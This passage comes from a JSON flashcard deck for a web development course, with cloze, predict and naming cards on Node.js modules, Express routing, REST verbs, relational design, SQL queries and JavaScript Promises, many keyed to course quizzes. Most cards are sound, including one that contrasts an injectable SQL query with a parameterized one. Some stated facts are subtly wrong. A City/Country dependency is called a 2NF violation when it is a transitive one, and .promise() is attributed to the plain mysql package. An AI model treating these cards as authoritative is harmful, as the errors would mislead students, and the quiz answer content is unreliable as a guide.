engine}}, which compiles JavaScript to {{native machine code}}.\n","answer":"Chrome V8 engine; native machine code","bloom":"remember","source":"Slide 4","explanation":"V8 is Google's JavaScript engine. Compiling to native machine code gives Node.js competitive execution speed without an interpreter.\n","example":"The same V8 engine runs inside Google Chrome to execute client-side JavaScript.\n"},{"id":"nodejs-basics-card-02","type":"cloze","prompt":"Node.js executes JavaScript {{outside a web browser}} using a {{single-threaded non-blocking}} execution model.\n","answer":"outside a web browser; single-threaded non-blocking","bloom":"remember","source":"Slide 4","explanation":"\"Single-threaded non-blocking\" is the professor's exact term. One thread handles all requests by delegating I/O to the OS and processing callbacks when results arrive.\n","example":"A Node.js server receiving 100 file requests issues 100 async OS calls and processes all callbacks on one thread — no waiting.\n"},{"id":"nodejs-basics-card-03","type":"name","prompt":"In the restaurant analogy, which example represents Node.js's execution model — where a single waiter takes orders at multiple tables without waiting for the kitchen?\n","answer":"Example 1 — single-threaded non-blocking","bloom":"understand","source":"Slide 4","explanation":"Example 1: one waiter takes an order at Table 1, sends it to the kitchen, then immediately takes Table 2's order. The waiter never idles. This mirrors Node.js delegating I/O and moving to the next request.\n","example":"Example 2 (blocking): the waiter stands at the kitchen window doing nothing until Table 1's meal is ready before going to Table 2.\n"},{"id":"nodejs-basics-card-04","type":"name","prompt":"In the restaurant analogy, which example represents the traditional synchronous blocking model — where one waiter waits at the kitchen before serving the next table?\n","answer":"Example 2 — single-threaded blocking","bloom":"understand","source":"Slide 4","explanation":"Example 2 shows one thread that blocks on I/O: it cannot handle the next request until the current one completes. This is the behaviour of naive synchronous server code (e.g. PHP/ASP.NET without async).\n","example":"Equivalent Node.js code: using `fs.readFileSync()` in a request handler blocks the event loop for every other request while the file loads.\n"},{"id":"nodejs-basics-card-05","type":"name","prompt":"In the restaurant analogy, which example represents a traditional multi-threaded server — one dedicated waiter per table?\n","answer":"Example 3 — multi-threaded (thread-per-request)","bloom":"understand","source":"Slide 4","explanation":"Example 3 scales by adding waiters (threads) — one per table (request). Each thread blocks on its own I/O, but parallel threads mean no table waits for another. Memory cost grows linearly with concurrent users.\n","example":"100 concurrent requests = 100 threads, all sitting blocked on I/O. Memory-inefficient at scale.\n"},{"id":"nodejs-basics-card-06","type":"name","prompt":"A synchronous multi-threaded server receives 100 concurrent requests. How many threads does it create?\n","answer":"100 threads — one per request","bloom":"remember","source":"Slide 4","explanation":"Thread-per-request servers allocate one thread per concurrent connection. Each thread blocks on I/O, so memory scales with request count. Node.js handles the same 100 requests on one thread via non-blocking I/O.\n","example":"At 100 concurrent users: synchronous server = 100 threads (100x memory cost). Node.js = 1 thread.\n"},{"id":"nodejs-basics-card-07","type":"predict","lang":"js","prompt":"A Node.js server calls `fs.readFile('data.json', callback)`. List the steps in execution order: (A) callback fires, (B) thread returns to event loop, (C) OS signals file ready, (D) readFile called.\n","code":"const fs = require('fs');\nconst http = require('http');\n\nhttp.createServer((req, res) =\u003e {\n  fs.readFile('data.json', 'utf8', (err, data) =\u003e {\n    res.end(data);\n  });\n  // what happens here immediately after readFile?\n}).listen(3000);\n","answer":"Order: D → B → C → A. readFile is called (D), thread immediately returns to event loop (B), OS later signals file ready (C), callback fires and res.end() runs (A).","bloom":"apply","source":"Slide 4","explanation":"readFile is non-blocking: it registers the callback with the OS and returns immediately. The thread processes other requests. When the OS signals completion, the event loop dequeues the callback.\n","example":"If the file takes 50 ms to read, the thread handles dozens of other requests during those 50 ms.\n"},{"id":"nodejs-basics-card-08","type":"name","prompt":"Which of these is NOT a built-in Node.js module: `url`, `fs`, `http`, `mysql`?\n","answer":"mysql — it is a third-party npm package, not built-in","bloom":"remember","source":"Quiz 7","explanation":"Built-in modules ship with Node.js: `url` parses URLs, `fs` handles the file system, `http` creates servers. `mysql` must be installed separately via npm.\n","example":"`require('fs')` — no install needed. `require('mysql')` — requires `npm install mysql` first.\n"},{"id":"nodejs-basics-card-09","type":"name","prompt":"Which built-in Node.js module handles file system operations (read, write, delete files)?\n","answer":"`fs`","bloom":"remember","source":"Quiz 7","explanation":"The `fs` module exposes both synchronous (blocking) and asynchronous (non-blocking) file system methods. Use the async variants (`fs.readFile`, `fs.writeFile`) in request handlers to avoid blocking the event loop.\n","example":"`fs.readFile('log.txt', 'utf8', (err, data) =\u003e { ... })` — non-blocking file read.\n"}]},{"id":"nodejs-modules","name":"Node.js built-in modules: http, url, fs","tags":["modules","require","http","url","fs","npm"],"prose":"Node.js ships three built-in modules used in every file server: http creates the server, url parses request URLs, and fs reads files from disk. External modules like mysql and express require npm install. Using pathname (not path) and res (not req) are the two most-tested distinctions.\n","cards":[{"id":"nodejs-modules-card-01","type":"name","bloom":"remember","source":"Quiz 7, Q1","prompt":"Which of these is NOT a built-in Node.js module?\n  A) http\n  B) url\n  C) mysql\n  D) fs\n","answer":"C) mysql. mysql is an external module — you must install it with `npm install mysql`.\nhttp, url, and fs ship with Node.js and need no installation.\n","explanation":"Built-in modules are part of the Node.js runtime. External modules live in npm's registry and must be listed in package.json after installation.\n","example":"const http = require('http');   // built-in — no install needed\nconst mysql = require('mysql'); // external — npm install mysql first\n"},{"id":"nodejs-modules-card-02","type":"name","bloom":"remember","source":"Quiz 7, Q2","prompt":"Which built-in Node.js module gives you access to the file system?","answer":"fs — the File System module. Load it with: const fs = require('fs');","explanation":"fs exposes file I/O operations. The primary async method for reading files is fs.readFile(filename, callback).","example":"const fs = require('fs');\nfs.readFile('index.html', function(err, data) {\n  // err is null if successful; data holds the file contents\n});\n"},{"id":"nodejs-modules-card-03","type":"cloze","bloom":"understand","source":"Quiz 7, Q3; Slide 4","prompt":"Given url.parse('http://localhost:8000/admin.html?user=123', true),\n{{parsed.pathname}} returns '/admin.html' and {{parsed.path}} returns '/admin.html?user=123'.\n","answer":"parsed.pathname; parsed.path","explanation":"pathname stops at the '?' delimiter — it holds only the path segment.\npath includes the pathname PLUS the query string.\nUsing path as a filename will fail because no file on disk is named '/admin.html?user=123'.\n","example":"console.log(parsed.pathname); // '/admin.html'\nconsole.log(parsed.path);     // '/admin.html?user=123'\n"},{"id":"nodejs-modules-card-04","type":"predict","bloom":"apply","source":"Quiz 7, Q3; Slide 4","prompt":"What does this code log?\n\n  const url = require('url');\n  const address = 'http://localhost:8000/admin.html?user=123';\n  const parsed = url.parse(address, true);\n  console.log(parsed.pathname);\n","answer":"/admin.html","explanation":"pathname extracts the path component without the query string.\nThe query string '?user=123' is separated into parsed.search and parsed.query, not included in pathname.\n","example":"Common wrong answer: '/admin.html?user=123' — that is parsed.path, not parsed.pathname","lang":"js"},{"id":"nodejs-modules-card-05","type":"predict","bloom":"analyze","source":"Quiz 7, Q4; Slide 4","prompt":"What does this code send to the client?\n\n  http.createServer(function(req, res) {\n    req.writeHead(200, { 'Content-Type': 'text/html' });\n    req.write('Hello');\n    req.end();\n  }).listen(8000);\n","answer":"Nothing — and it throws a TypeError at runtime.\nreq.writeHead, req.write, and req.end are not functions on the request object.\nThe response must be written through res, not req.\n","explanation":"req is the IncomingMessage — it represents data flowing IN from the client.\nres is the ServerResponse — it represents data flowing OUT to the client.\nOnly res has writeHead, write, and end.\n","example":"// Correct:\nhttp.createServer(function(req, res) {\n  res.writeHead(200, { 'Content-Type': 'text/html' });\n  res.write('Hello');\n  res.end();\n}).listen(8000);\n","lang":"js"},{"id":"nodejs-modules-card-06","type":"cloze","bloom":"apply","source":"Quiz 7, Q5; Slide 4","prompt":"To import a custom module at './modules/math.js', you write:\n  const math = require({{./modules/math}});\n","answer":"./modules/math","explanation":"Custom modules always use a relative path beginning with './' or '../'.\nWithout the './' prefix, Node.js looks in node_modules (built-in and npm packages), not the local filesystem.\n","example":"const math = require('./modules/math');    // works\nconst math2 = require('./modules/math.js'); // also works — .js extension optional\n"},{"id":"nodejs-modules-card-07","type":"name","bloom":"remember","source":"Slide 4, Slide 11","prompt":"What command installs an external npm module called 'express' and what file records it as a dependency?","answer":"Install: npm install express (or: npm i express). Recorded in: package.json","explanation":"npm init --yes creates a package.json with default values.\nEvery npm install adds the module to node_modules/ and records its version in package.json under \"dependencies\".\n","example":"npm init --yes          # create package.json\nnpm install express     # install and record dependency\n"},{"id":"nodejs-modules-card-08","type":"predict","bloom":"apply","source":"Slide 4","prompt":"A Node.js http server is created but `.listen()` is never called. What happens when you run the file?\n","answer":"The server starts, then immediately exits — no port is bound, no connections are accepted. The process has nothing to keep it alive.","explanation":".listen(port) binds the server to a TCP port and keeps the event loop running.\nWithout it, Node.js finishes executing the synchronous code and exits because no async work is pending.\n","example":"// Missing .listen() — server exits immediately:\nhttp.createServer(function(req, res) { ... });\n// Correct:\nhttp.createServer(function(req, res) { ... }).listen(8080);\n","lang":"js"},{"id":"nodejs-modules-card-09","type":"name","bloom":"understand","source":"Slide 4","prompt":"What are the three response methods used inside http.createServer, and what does each do?","answer":"res.writeHead(statusCode, headers) — sets HTTP status code and response headers. res.write(data) — sends a chunk of the response body. res.end() — signals the response is finished (required).\n","explanation":"writeHead must be called before write. end must always be called — without it the client hangs waiting for more data.","example":"res.writeHead(200, { 'Content-Type': 'text/html' });\nres.write('\u003ch1\u003eHello\u003c/h1\u003e');\nres.end();\n"},{"id":"nodejs-modules-card-10","type":"cloze","bloom":"understand","source":"Slide 11","prompt":"To read an environment variable named PORT in Node.js, you write:\n  const port = {{process.env}}.PORT;\n","answer":"process.env","explanation":"process.env is an object containing all environment variables set in the shell or OS.\nIf PORT is not set, process.env.PORT returns undefined — not an error.\n","example":"const port = process.env.PORT;  // undefined if not set in environment"}]},{"id":"express-framework","name":"Express: Routing, Middleware, RESTful Endpoints","tags":["express","routing","middleware","rest","npm"],"prose":"Express is an npm package that adds declarative routing and a composable middleware pipeline to Node.js. It is the standard framework for building RESTful APIs in Node.js server-side development.","priority":"mid","source":"Slide 8","cards":[{"id":"express-framework-card-01","type":"cloze","prompt":"To install Express in a Node.js project, first run {{npm init --yes}} to create package.json, then run {{npm install express}} to add the package.","answer":"npm init --yes; npm install express","bloom":"remember","source":"Slide 8","explanation":"npm init --yes creates package.json, which records installed packages as dependencies. Without it, running npm install still downloads the package but does not lock the version for reproducible installs.","example":"`npm init --yes && npm install express` — the two commands that scaffold an Express project from scratch."},{"id":"express-framework-card-02","type":"name","prompt":"What is middleware in the context of Express?","answer":"An Express function in the request pipeline that can read, modify, or short-circuit the request before the route handler.","bloom":"understand","source":"Slide 8","explanation":"Middleware is registered with app.use() and runs in order before the matching route handler. A middleware that does not call next() and does not send a response will stall the request.","example":"`app.use(express.json())` is middleware that parses incoming JSON bodies and populates req.body before any route handler runs."},{"id":"express-framework-card-03","type":"name","prompt":"What is the difference between PUT and PATCH in a RESTful API?","answer":"PUT replaces the entire resource. PATCH updates a single property.","bloom":"understand","source":"Slide 8","explanation":"Sending a PUT with only a subset of fields erases the omitted fields — the whole record is replaced. PATCH is a surgical update; only the named property changes. These are distinct operations and should not be used interchangeably.","example":"PUT /api/v1/patients/1 with body `{name: 'Ali'}` replaces the full patient record. PATCH /api/v1/patients/1 with `{name: 'Ali'}` changes only the name field."},{"id":"express-framework-card-04","type":"cloze","prompt":"To list all patients, the client calls {{GET}} {{/api/v1/patients/}}. To get a single patient with id 3, the client calls {{GET}} {{/api/v1/patients/3}}.","answer":"GET /api/v1/patients/; GET /api/v1/patients/3","bloom":"apply","source":"Slide 8","explanation":"The collection URL returns all resources. Appending /:id scopes the request to one resource. This URL design follows RESTful convention — the resource name is plural and the id is a path segment, not a query parameter.","example":"`app.get('/api/v1/patients', handler)` catches the list-all request. `app.get('/api/v1/patients/:id', handler)` catches the single-resource request; the id is available as req.params.id."},{"id":"express-framework-card-05","type":"cloze","prompt":"To read the server port from an environment variable with a local fallback, write: `const PORT = {{process.env.PORT}} || {{8888}}`.","answer":"process.env.PORT; 8888","bloom":"apply","source":"Slide 8","explanation":"process.env.PORT reads the PORT variable set by the hosting platform. If not set, the value is undefined, so the || fallback kicks in. Hard-coding the port breaks deployment to platforms that assign ports dynamically.","example":"`const PORT = process.env.PORT || 8888;` — undefined || 8888 evaluates to 8888 in local development, and the platform-assigned port in production."},{"id":"express-framework-card-06","type":"name","prompt":"Is POST idempotent? Explain why.","answer":"No. POST creates a new resource each time it is called, so repeated identical requests produce multiple records.","bloom":"understand","source":"Slide 8","explanation":"An operation is idempotent if applying it multiple times produces the same result as applying it once. POST violates this: each call creates an additional server-side resource. PUT is idempotent — applying the same replacement twice leaves the record in the same state.","example":"POST /api/v1/patients twice creates two patient records. PUT /api/v1/patients/1 twice leaves one patient record in the replaced state — the second call changes nothing observable."},{"id":"express-framework-card-07","type":"cloze","prompt":"The CORS middleware header {{Access-Control-Allow-Origin}} permits any origin. The header {{Access-Control-Allow-Headers}} is required when the browser preflight includes Content-Type.","answer":"Access-Control-Allow-Origin; Access-Control-Allow-Headers","bloom":"apply","source":"Slide 8","explanation":"Browsers send a preflight OPTIONS request for cross-origin requests that carry Content-Type: application/json. The server must respond with Access-Control-Allow-Headers: Content-Type or the preflight fails and the actual request is never sent.","example":"res.setHeader('Access-Control-Allow-Origin', '*');\nres.setHeader('Access-Control-Allow-Headers', 'Content-Type');\n"},{"id":"express-framework-card-08","type":"name","prompt":"What happens if a custom middleware function does not call next() and does not send a response?","answer":"The request stalls permanently — the client never receives a response and the connection times out.","bloom":"understand","source":"Slide 8","explanation":"next() passes control to the next middleware in the pipeline or to the matched route handler. Without it and without res.send()/res.json(), Express has nowhere to forward the request and the pipeline stops silently.","example":"CORS middleware must call next() after setting headers; omitting next() means GET /api/v1/patients never reaches the app.get handler and the browser receives no response."}]}]},{"id":"m4-databases-crud","name":"Databases and CRUD","topics":[{"id":"db-relational-design","name":"Relational DB design: keys, relationships, and normalization","tags":["MySQL","primary-key","foreign-key","1NF","2NF","referential-integrity","1:M","M:M"],"prose":"A relational database stores each entity in its own table. A primary key uniquely identifies each row; a foreign key links a child table to a parent table's primary key. That link encodes a 1:M relationship. M:M relationships require a junction table. Referential integrity guarantees every foreign key value points to an existing primary key. First normal form (1NF) requires atomic values per cell. Second normal form (2NF) requires every non-key column to depend on the whole primary key.\n","cards":[{"id":"db-relational-design-card-01","type":"cloze","bloom":"remember","source":"Slide 7","prompt":"A {{primary key}} is a column that uniquely identifies each row in a table and cannot be NULL.","answer":"primary key","explanation":"The primary key enforces row uniqueness. Every table should have one. The patientid column in the Patient table is a primary key.\n","example":"In CREATE TABLE patient, the line PRIMARY KEY(patientid) declares patientid as the primary key.\n"},{"id":"db-relational-design-card-02","type":"cloze","bloom":"remember","source":"Slide 7","prompt":"A {{foreign key}} is a column in a child table that references the primary key of a parent table.","answer":"foreign key","explanation":"The foreign key is the link between tables. patientid in the Visit table is a foreign key referencing patientid in Patient.\n","example":"CONSTRAINT fk_has_patient FOREIGN KEY(patientid) REFERENCES patient(patientid)\n"},{"id":"db-relational-design-card-03","type":"cloze","bloom":"understand","source":"Slide 7","prompt":"{{Referential integrity}} means every foreign key value in a child table has a matching primary key value in the parent table.\n","answer":"Referential integrity","explanation":"Deleting a parent row with matching child rows breaks referential integrity. MySQL blocks such deletions when a foreign key constraint is active.\n","example":"Deleting a patient row that has visit rows violates referential integrity — the visit rows become orphans pointing to a non-existent patient.\n"},{"id":"db-relational-design-card-04","type":"cloze","bloom":"understand","source":"Slide 7, Quiz 10","prompt":"A table satisfies {{first normal form (1NF)}} when every column holds one atomic value per row and no repeating groups exist.\n","answer":"first normal form (1NF)","explanation":"Storing multiple visit dates in one column violates 1NF. Splitting into separate visit rows with one date each satisfies 1NF.\n","example":"A Patient table with visitDate1, visitDate2 columns violates 1NF. A separate Visit table with one visitDate per row satisfies 1NF.\n"},{"id":"db-relational-design-card-05","type":"cloze","bloom":"analyze","source":"Slide 10, Quiz 10","prompt":"A table satisfies {{second normal form (2NF)}} when it satisfies 1NF and every non-key column depends on the entire primary key, not a subset.\n","answer":"second normal form (2NF)","explanation":"A table with PersonID (PK), Name, City, Country satisfies 1NF but violates 2NF because Country depends on City, not on PersonID.\n","example":"ISAQuiz10 Q5: professor's answer is \"violates 2NF, but complies with 1NF\" — atomic values (1NF passes) but City/Country depend on each other (2NF fails).\n"},{"id":"db-relational-design-card-06","type":"predict","bloom":"apply","source":"Slide 7, Quiz 10","prompt":"The patient table has 3 rows. The visit table has 3 rows. What does `SELECT * FROM patient, visit` return?\n","answer":"9 rows — the Cartesian product of 3 × 3.","explanation":"A Cartesian join pairs every row from the first table with every row from the second. Identical column names do NOT reduce the row count.\n","example":"ISAQuiz10 Q6: distractors claim column name collision reduces row count. It does not. Result is always n × m rows.\n","lang":"sql"},{"id":"db-relational-design-card-07","type":"diagram","bloom":"analyze","source":"Quiz 10, Q4","prompt":"Two tables are shown below. Identify the relationship type between them.\nperson table: personID (PK), name, dob birthCertificate table: certID (PK), personID (FK UNIQUE), issueDate\nThe personID column in birthCertificate is UNIQUE — no person appears twice.\n","labels":{"???REL":"1:1"},"mermaid":"erDiagram\n  person ||--|| birthCertificate : \"???REL\"\n  person { int personID }\n  birthCertificate { int certID int personID }\n","answer":"1:1 — one person has exactly one birth certificate.","explanation":"When the foreign key column in the child table is unique, each parent row maps to at most one child row. That is a 1:1 relationship, not 1:M.\n","example":"ISAQuiz10 Q4: person/birthCertificate is a classic 1:1. Contrast with Patient/Visit (one patient, many visits) which is 1:M.\n"},{"id":"db-relational-design-card-08","type":"name","bloom":"apply","source":"Slide 7","prompt":"An Author table and a Book table need a M:M relationship. What table structure resolves this, and what is its primary key?\n","answer":"Add a junction table (AuthorBook) with a composite primary key made of authorid (FK) and bookid (FK).\n","explanation":"No single foreign key can represent M:M. A junction table decomposes the M:M into two 1:M relationships. The composite PK uniquely identifies each author-book pairing.\n","example":"AuthorBook(authorid FK, bookid FK, PRIMARY KEY(authorid, bookid))\n"}]},{"id":"sql-crud","name":"SQL CRUD: querying and modifying data","tags":["SQL","SELECT","INSERT","UPDATE","DELETE","WHERE","JOIN","CRUD","GROUP-BY","subquery"],"prose":"SQL CRUD covers SELECT, INSERT, UPDATE, DELETE along with filtering (WHERE), grouping (GROUP BY/HAVING), pattern matching (LIKE), joins, and subqueries. The most common exam traps are WHERE on aggregates (use HAVING), bare-comma joins (Cartesian product), and IS vs = for string comparisons.","cards":[{"id":"sql-crud-card-01","type":"cloze","source":"Slide 7","bloom":"remember","prompt":"HAVING filters {{aggregated groups after GROUP BY}}; WHERE filters individual rows before grouping.","answer":"aggregated groups after GROUP BY","explanation":"WHERE runs before GROUP BY and cannot see aggregate results. HAVING runs after GROUP BY and can filter on COUNT, AVG, etc.","example":"SELECT Country, COUNT(CustomerID) AS c\nFROM Customers\nGROUP BY Country\nHAVING c \u003e 2;\n"},{"id":"sql-crud-card-02","type":"predict","source":"Slide 7","bloom":"apply","prompt":"The patient table has 3 rows. The visit table has 3 rows. What does `SELECT * FROM patient, visit` return?","answer":"9 rows — the Cartesian product pairs every patient row with every visit row.","explanation":"A bare comma in FROM produces a Cartesian product. The correct equi-join adds WHERE patient.patientid = visit.patientid to return only matched rows.","example":"-- Cartesian (wrong)\nSELECT * FROM patient, visit;\n-- Equi-join (right)\nSELECT * FROM patient, visit\nWHERE patient.patientid = visit.patientid;\n","lang":"sql"},{"id":"sql-crud-card-03","type":"name","source":"Slide 7, Quiz 10","bloom":"remember","prompt":"Which SQL keyword retrieves only unique values from a column?","answer":"DISTINCT","explanation":"SELECT DISTINCT Country FROM Customers returns one row per unique country value, eliminating duplicates.","example":"SELECT DISTINCT Country FROM Customers;\n"},{"id":"sql-crud-card-04","type":"cloze","source":"Slide 7, Quiz 10","bloom":"apply","prompt":"Use {{parameterized queries}} with `?` placeholders — never string interpolation — to prevent SQL injection.","answer":"parameterized queries","explanation":"Template-literal SQL concatenates user input directly into the query string. Parameterized queries pass data as a separate argument; the driver treats it as data, never as SQL syntax.","example":"// Vulnerable\ndb.query(`SELECT * FROM users WHERE name = '${input}'`);\n// Safe\ndb.query('SELECT * FROM users WHERE name = ?', [input]);\n"},{"id":"sql-crud-card-05","type":"cloze","source":"Slide 7, Quiz 10","bloom":"remember","prompt":"In a LIKE pattern, `%` matches {{zero or more characters}} and `_` matches exactly one character.","answer":"zero or more characters","explanation":"LIKE is used in WHERE clauses for pattern matching. WHERE Country LIKE 'A%' returns every country starting with 'A'.","example":"SELECT * FROM Customers WHERE Country LIKE 'A%';\nSELECT * FROM Customers WHERE name LIKE 'a%' OR name LIKE 'B%';\n"},{"id":"sql-crud-card-06","type":"predict","source":"Quiz 10","bloom":"analyze","prompt":"A developer writes `WHERE department is 'HR'`. What is wrong and what is the fix?","answer":"Syntax error. `IS` tests for NULL, not string equality. Fix: `WHERE department = 'HR'`.","explanation":"`IS` and `IS NOT` are reserved for NULL comparisons. The equality operator = handles string comparisons.","example":"-- Wrong\nSELECT * FROM Employees WHERE department is 'HR';\n-- Right\nSELECT * FROM Employees WHERE department = 'HR';\n","lang":"sql"},{"id":"sql-crud-card-07","type":"name","source":"Slide 7","bloom":"apply","prompt":"Write a SQL query returning every product whose price exceeds the catalogue average.","answer":"SELECT * FROM Products WHERE price \u003e (SELECT AVG(price) FROM Products);","explanation":"The inner SELECT returns the average price as a scalar. The outer WHERE compares each row's price against it.","example":"SELECT * FROM Products\nWHERE price \u003e (SELECT AVG(price) FROM Products);\n"}]},{"id":"sql-promises","name":"Async DB queries with promises: chaining successive SQL calls","tags":["promises","async-db","mysql","chaining","successive-queries"],"prose":"The mysql module's .promise() method wraps a connection and returns a promise-based query interface. Successive SQL statements that depend on each other's results must be chained with .then() or await to guarantee ordering. Firing queries without awaiting previous results produces a race condition.\n","cards":[{"id":"sql-promises-card-01","type":"cloze","source":"Slide 11","bloom":"remember","prompt":"The mysql module method that returns a promise-based query interface is `con.{{promise}}()`.","answer":"promise","explanation":"con.promise() wraps the existing connection object and returns a new object whose query() method returns a Promise instead of taking a callback.\n","example":"const promiseCon = con.promise();\npromiseCon.query('SELECT ...', [id]); // returns a Promise\n"},{"id":"sql-promises-card-02","type":"cloze","source":"Slide 11","bloom":"understand","prompt":"When `con.promise().query()` resolves, it yields an array `{{[rows, fields]}}` — destructure the first element to get result rows.","answer":"[rows, fields]","explanation":"mysql resolves promise queries with a two-element array: rows (the query results) and fields (column metadata). Destructuring with const [rows] = await ... gives direct access to the result objects.\n","example":"const [rows] = await promiseCon.query('SELECT * FROM patient WHERE patientid = ?', [id]);\n"},{"id":"sql-promises-card-03","type":"cloze","source":"Slide 11","bloom":"analyze","prompt":"Running an UPDATE without first awaiting the SELECT result produces a {{race condition}} — the check and write are not sequenced.","answer":"race condition","explanation":"Without await or .then() chaining, both queries enter the MySQL queue simultaneously. The UPDATE can execute before the SELECT result arrives, bypassing the existence check.\n","example":"// Wrong — no ordering guarantee:\npromiseCon.query('SELECT ...', [id]);\npromiseCon.query('UPDATE ...', [data, id]);\n// Correct:\nconst [rows] = await promiseCon.query('SELECT ...', [id]);\nif (rows.length === 0) throw new Error('Not found');\nawait promiseCon.query('UPDATE ...', [data, id]);\n"},{"id":"sql-promises-card-04","type":"name","source":"Slide 5, Slide 11","bloom":"remember","prompt":"What Node.js command installs the mysql module?","answer":"npm install mysql","explanation":"mysql is not a built-in Node.js module. Node.js uses a module resolution algorithm that looks in node_modules/; npm install mysql places the package there, making require('mysql') succeed. The package.json entry records the dependency but is not itself the mechanism.\n","example":"npm install mysql\n// Then: const mysql = require('mysql');\n"},{"id":"sql-promises-card-05","type":"predict","source":"Slide 11","bloom":"apply","prompt":"Trace this chain. What is `rows` inside the first `.then()` if one patient matches?\n\n```js\npromiseCon\n  .query('SELECT * FROM patient WHERE patientid = ?', [7])\n  .then(([rows]) =\u003e {\n    return promiseCon.query('UPDATE patient SET name = ? WHERE patientid = ?', ['Alice', 7]);\n  });\n```\n","answer":"rows is an array with one object: [{ patientid: 7, ... }]","explanation":"mysql resolves with [rows, fields]. The destructuring [rows] extracts the first element — the array of result row objects. One matching record means rows.length === 1.\n","example":"// rows = [{ patientid: 7, name: 'Bob', ... }]\n","lang":"sql"},{"id":"sql-promises-card-06","type":"cloze","source":"Slide 11","bloom":"understand","prompt":"To sequence SELECT then UPDATE, return the second `promiseCon.query()` call {{inside the .then() handler}} of the first.","answer":"inside the .then() handler","explanation":"Returning a Promise from inside a .then() handler causes the next .then() to wait for that returned Promise to settle. This enforces sequential execution.\n","example":"promiseCon.query('SELECT ...', [id])\n  .then(([rows]) =\u003e {\n    if (rows.length === 0) throw new Error('Not found');\n    return promiseCon.query('UPDATE ...', [data, id]);\n  })\n  .catch(err =\u003e { /* handles both */ });\n"}]},{"id":"nodejs-db-connect","name":"Node.js MySQL connection, mysql module, executing queries, XAMPP/phpMyAdmin, cPanel hosting","tags":["mysql","nodejs","npm","XAMPP","phpMyAdmin","cPanel","hosting"],"prose":"The mysql package is an external Node.js module. Install with npm install mysql, then use createConnection, connect, and query to talk to a MySQL database. Keep all connection code server-side. Use XAMPP locally (MySQL + phpMyAdmin), cPanel for production.","cards":[{"id":"nodejs-db-connect-card-01","type":"cloze","source":"Slide 5, Quiz 7","bloom":"remember","prompt":"The mysql module is {{not a built-in}} Node.js module — install it with `npm install mysql`.","answer":"not a built-in","explanation":"Built-in modules (url, http, fs, path, os) require no installation. The mysql package lives in npm and must be explicitly installed.","example":"Running node app.js without installing mysql throws: Error: Cannot find module 'mysql'."},{"id":"nodejs-db-connect-card-02","type":"name","source":"Slide 5","bloom":"remember","prompt":"What four properties does `mysql.createConnection()` accept to identify the target database?","answer":"host, user, password, and database (schema name).","explanation":"These four properties tell the mysql driver where the server is, how to authenticate, and which schema to use.","example":"mysql.createConnection({ host: 'localhost', user: 'root', password: '', database: 'mydb' })"},{"id":"nodejs-db-connect-card-03","type":"predict","source":"Slide 5, Quiz 7","bloom":"apply","prompt":"You log `result` on the line immediately after `con.query(sql, callback)` — outside the callback. What does the log show?","answer":"undefined. con.query is asynchronous — the database has not responded yet. result is only defined inside the callback.","explanation":"Node.js dispatches the query and continues running synchronous code. The callback fires later when MySQL responds.","example":"con.query('SELECT...', cb); console.log(result); // undefined — callback has not fired yet","lang":"sql"},{"id":"nodejs-db-connect-card-04","type":"cloze","source":"Quiz 7","bloom":"analyze","prompt":"Placing MySQL connection credentials in client-side code exposes your {{username and password}} to anyone who views page source.","answer":"username and password","explanation":"Browser JavaScript is downloaded to every visitor and readable via DevTools → Sources. A client-side mysql.createConnection means the DB password is embedded in public code — any user can extract it and connect to the database directly, bypassing all server-side authorization.","example":"A visitor opens DevTools → Sources and reads password: 'db_secret_123' — full DB access gained without authenticating to the app."},{"id":"nodejs-db-connect-card-05","type":"name","source":"Slide 5, Slide 7","bloom":"remember","prompt":"What tool does XAMPP install alongside the MySQL engine for visual database management?","answer":"phpMyAdmin — a browser-based admin interface at http://localhost/phpmyadmin/ for creating databases, tables, and running SQL queries.","explanation":"XAMPP bundles MySQL and phpMyAdmin. Start MySQL in the XAMPP control panel, click Admin, and phpMyAdmin opens.","example":"In phpMyAdmin: click New → name the database → create a table → paste SQL in the SQL tab → press GO."},{"id":"nodejs-db-connect-card-06","type":"predict","source":"Slide 7","bloom":"understand","prompt":"A patient table declares patientid INT NOT NULL AUTO_INCREMENT PRIMARY KEY. An INSERT omits patientid entirely. What happens?","answer":"MySQL assigns the next unique integer automatically. The insert succeeds and result.insertId holds the generated value.","explanation":"AUTO_INCREMENT removes the need to supply primary key values manually. The database engine increments and assigns the key on every insert.","example":"INSERT INTO patient (name) VALUES ('Ada Lovelace') — patientid assigned by MySQL, not specified.","lang":"sql"}]}]},{"id":"m5-promises-async-programming","name":"Promises and Async Programming","topics":[{"id":"promises-basics","name":"Promise object: constructor, executor, resolve/reject, pending/fulfilled/rejected states","tags":["promises","resolve","reject","pending","fulfilled","rejected","executor"],"prose":"A Promise is a JavaScript object representing an eventual value. The executor function runs eagerly on construction, synchronously calling resolve or reject to settle the Promise. Settlement is final and exclusive — the first of resolve or reject that fires wins; subsequent calls are ignored. .then() handlers are microtasks: they enqueue when the Promise is settled and run only after the current synchronous call stack empties.","cards":[{"id":"promises-basics-card-01","type":"cloze","source":"Slide 6 (Slide 19)","bloom":"remember","prompt":"A Promise executor runs {{eagerly}}: it executes synchronously at the moment `new Promise(executor)` is called, before any following statement.","answer":"eagerly","explanation":"The executor is not deferred. It runs on the current call stack, immediately on construction. Any console.log inside the executor prints before subsequent synchronous lines outside the Promise.","example":"new Promise((resolve) =\u003e {\n  console.log('A'); // prints first — eager executor\n  resolve('B');\n});\nconsole.log('C'); // prints second — sync, after executor\n// Output: A, C  (then 'B' via .then if attached)\n"},{"id":"promises-basics-card-02","type":"name","source":"Slide 6 (Slides 13–14)","bloom":"remember","prompt":"What is the initial state of every Promise when it is first constructed?","answer":"pending","explanation":"Every Promise starts in the pending state. It stays pending until resolve() transitions it to fulfilled, or reject() transitions it to rejected. If neither is ever called, it remains pending forever.","example":"let p = new Promise((resolve, reject) =\u003e {\n  console.log('executor ran'); // resolve/reject never called\n});\n// p.[[PromiseState]] === 'pending' — forever\n"},{"id":"promises-basics-card-03","type":"cloze","source":"Slide 6 (Slide 17), ISAQuiz8 Q3","bloom":"understand","prompt":"Once a Promise is settled, calling `resolve()` or `reject()` again {{has no effect}}; the state never changes a second time.","answer":"has no effect","explanation":"Settlement is final. The state machine has no reverse transition. Only the first call to resolve or reject that exits the pending state counts; all subsequent calls are silently ignored.","example":"let p = new Promise((resolve, reject) =\u003e {\n  reject('3');   // settles: rejected\n  resolve('4'); // ignored — already settled\n});\np.then(null, (r) =\u003e console.log(r)); // logs '3', never '4'\n"},{"id":"promises-basics-card-04","type":"predict","lang":"js","source":"ISAQuiz8 Q3, Slide 6 (Slide 17)","bloom":"apply","prompt":"What is the exact console output of this code? Explain why each line prints when it does.\n```js\nlet promise = new 